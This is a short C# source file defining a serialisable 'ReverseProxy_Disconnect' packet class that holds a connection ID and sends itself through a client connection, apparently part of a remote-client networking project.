using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxy_Disconnect : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        public ReverseProxy_Disconnect(int ConnectionId)
        {
            this.ConnectionId = ConnectionId;
        }

        public ReverseProxy_Disconnect()
        {

        }

        public void Execute(Client client)
        {
            client.Send<ReverseProxy_Disconnect>(this);
        }
    }
}
